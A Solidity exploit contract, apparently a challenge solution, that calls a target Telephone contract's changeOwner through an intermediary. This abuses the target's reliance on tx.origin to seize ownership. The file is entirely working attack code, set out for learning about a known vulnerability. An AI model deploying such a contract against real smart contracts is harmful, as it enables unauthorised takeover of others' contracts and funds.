// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "./Telephone.sol";

/// @title Contract for hacking Telephone.sol
/// @author Pedro Reyes
/// @custom:link https://docs.soliditylang.org/en/v0.8.15/units-and-global-variables.html?highlight=tx.origin#block-and-transaction-properties
/// @custom:link https://docs.soliditylang.org/en/v0.8.15/security-considerations.html?highlight=tx.origin#tx-origin
/// @custom:link https://ethereum.stackexchange.com/questions/196/how-do-i-make-my-dapp-serenity-proof
contract HackTelephone {
    Telephone telephone;

    constructor(address _address) {
        telephone = Telephone(_address);
    }

    /// @dev Change the owner of the telephone.
    function changeOwner(address _owner) public {
        telephone.changeOwner(_owner);
    }
}
